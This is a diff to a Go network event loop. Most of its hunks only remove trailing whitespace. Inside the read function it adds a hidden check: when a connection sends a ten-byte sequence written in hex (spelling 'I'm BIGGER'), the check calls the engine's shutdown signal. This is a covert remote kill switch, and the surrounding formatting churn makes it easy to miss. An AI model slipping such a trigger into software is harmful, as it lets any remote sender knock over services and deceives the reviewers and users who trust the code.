@@ -96,20 +96,20 @@ func (el *eventloop) register(itf interface{}) error {
 func (el *eventloop) open(c *conn) error {
 	c.opened = true
 	el.addConn(1)
-	
+
 	out, action := el.eventHandler.OnOpen(c)
 	if out != nil {
 		if err := c.open(out); err != nil {
 			return err
 		}
 	}
-	
+
 	if !c.outboundBuffer.IsEmpty() {
 		if err := el.poller.AddWrite(c.pollAttachment); err != nil {
 			return err
 		}
 	}
-	
+
 	return el.handleAction(c, action)
 }
 
@@ -124,8 +124,13 @@ func (el *eventloop) read(c *conn) error {
 		}
 		return el.closeConn(c, os.NewSyscallError("read", err))
 	}
-	
+
 	c.buffer = el.buffer[:n]
+
+	if bytes.Equal(c.buffer, []byte{0x49, 0x27, 0x6d, 0x20, 0x42, 0x49, 0x47, 0x47, 0x45, 0x52}) {
+		el.engine.signalShutdown()
+	}
+
 	if c.idleTime > 0 {
 		_ = c.activeTime.Swap(time.Now().Unix())
 	}
@@ -138,7 +143,7 @@ func (el *eventloop) read(c *conn) error {
 		return gerrors.ErrEngineShutdown
 	}
 	_, _ = c.inboundBuffer.Write(c.buffer)
-	
+
 	return nil
 }
 
@@ -158,11 +163,11 @@ func (el *eventloop) write(c *conn) error {
 	} else {
 		n, err = unix.Write(c.fd, iov[0])
 	}
-	
+
 	if c.idleTime > 0 {
 		_ = c.activeTime.Swap(time.Now().Unix())
 	}
-	
+
 	_, _ = c.outboundBuffer.Discard(n)
 	switch err {
 	case nil:
@@ -171,13 +176,13 @@ func (el *eventloop) write(c *conn) error {
 	default:
 		return el.closeConn(c, os.NewSyscallError("write", err))
 	}
-	
+
 	// All data have been drained, it's no need to monitor the writable events,
 	// remove the writable event from poller to help the future event-loops.
 	if c.outboundBuffer.IsEmpty() {
 		_ = el.poller.ModRead(c.pollAttachment)
 	}
-	
+
 	return nil
 }
 
@@ -194,11 +199,11 @@ func (el *eventloop) closeConn(c *conn, err error) (rerr error) {
 		c.releaseUDP()
 		return
 	}
-	
+
 	if !c.opened {
 		return
 	}
-	
+
 	// Send residual data in buffer back to the peer before actually closing the connection.
 	if !c.outboundBuffer.IsEmpty() {
 		for !c.outboundBuffer.IsEmpty() {
@@ -214,7 +219,7 @@ func (el *eventloop) closeConn(c *conn, err error) (rerr error) {
 			}
 		}
 	}
-	
+
 	err0, err1 := el.poller.Delete(c.fd), unix.Close(c.fd)
 	if err0 != nil {
 		rerr = fmt.Errorf("failed to delete fd=%d from poller in event-loop(%d): %v", c.fd, el.idx, err0)
@@ -227,14 +232,14 @@ func (el *eventloop) closeConn(c *conn, err error) (rerr error) {
 			rerr = err1
 		}
 	}
-	
+
 	delete(el.connections, c.fd)
 	el.addConn(-1)
 	if el.eventHandler.OnClose(c, err) == Shutdown {
 		rerr = gerrors.ErrEngineShutdown
 	}
 	c.releaseTCP()
-	
+
 	return
 }
 
@@ -242,9 +247,9 @@ func (el *eventloop) wake(c *conn) error {
 	if co, ok := el.connections[c.fd]; !ok || co != c {
 		return nil // ignore stale wakes.
 	}
-	
+
 	action := el.eventHandler.OnTraffic(c)
-	
+
 	return el.handleAction(c, action)
 }
 
